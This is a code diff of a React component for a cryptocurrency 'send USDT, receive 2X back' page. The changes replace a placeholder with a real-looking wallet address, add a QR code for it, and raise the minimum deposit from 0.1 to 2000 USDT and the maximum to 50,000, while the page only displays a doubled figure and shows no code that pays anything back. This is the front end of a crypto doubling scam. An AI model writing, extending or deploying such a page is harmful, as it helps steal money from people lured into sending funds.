@@ -1,15 +1,17 @@
 import { useState } from "react";
+import barCode from "../assets/USDT.png"
+import spinner from "../assets/spinner.svg"
 
 export default function USDT() {
     const [amount, setAmount] = useState('');
     const [approve, setApporve] = useState(false);
     const [copied, setCopied] = useState(false);
 
-    const Address = "Osas is a champ";
+    const Address = "0xC5743D6C61E54C017964A5955792D38999fCF48A";
 
     function handleAmount(event) {
         const inputValue = parseFloat(event.target.value);
-        if (isNaN(inputValue) || inputValue < 0.1) {
+        if (isNaN(inputValue) || inputValue < 2000) {
             setAmount(0);
         } else {
             setAmount(inputValue * 2);
@@ -39,21 +41,22 @@ export default function USDT() {
             <div className="form formContainer participateRight">
                 <div className="title">
                     <p> Make a transfer to the <span>specified</span> address to receive <span>2X</span> back </p>
-                    <div className="waiting"><img src="/assets/258f73b8.svg" width="24" alt="" /><span>Waiting for
+                    <div className="waiting"><img src={spinner} width="24" alt="" /><span>Waiting for
                         payment</span></div>
                 </div>
                 <div className="formGroup">
                     <div className="formInput formInputWithButton">
                         <p>Participation wallet</p>
                         <div className="input">
-                            <div className="value">bc1qs7r5gnfpe5pcy5zt6afpe7mh6m4mwh774yzmh3</div>
+                            <div className="value">{Address}</div>
                         </div><button onClick={copyText} className="">{copied ? "Copied!" : "Copy address"}</button>
                     </div>
                     <div className="formInput formInputWithButton">
                         <p>Participation amount</p>
                         <div className="input"><span className="errorText"> The minimum value allowed is
-                            0.1</span><span>USDT</span></div><button className="disabled"> Copy amount </button>
+                            2000</span><span>USDT</span></div><button className="disabled"> Copy amount </button>
                     </div>
+                    <div className="qr"><img className="canvas" width={132} height={132} src={barCode}></img> </div>
                 </div>
             </div>
 
@@ -66,8 +69,8 @@ export default function USDT() {
                         </div>
                         <div className="formGroup">
                             <div><label className="input"><input onChange={handleAmount} placeholder="Enter Amount" type="number" /><span className="currency">USDT</span></label>
-                                <div className="group"><small className="small"> Min: <span>0.1 USDT</span></small><small
-                                    className="small"> Max: <span>250 USDT</span></small></div>
+                                <div className="group"><small className="small"> Min: <span>2000 USDT</span></small><small
+                                    className="small"> Max: <span>50,000 USDT</span></small></div>
                             </div>
                         </div>
                     </div>
@@ -80,8 +83,8 @@ export default function USDT() {
                         </div>
                         <div><label className="input"><input defaultValue={amount} placeholder="Waiting for input..." type="number" /><span
                             className="currency">USDT</span></label>
-                            <div className="group"><small className="small"> Min: <span>0.2 USDT</span></small><small
-                                className="small"> Max: <span>500 USDT</span></small></div>
+                            <div className="group"><small className="small"> Min: <span>4000 USDT</span></small><small
+                                className="small"> Max: <span>80,000 USDT</span></small></div>
                         </div>
                     </div>
                     <div className="formInput-2 formInput  formInputWithButton">
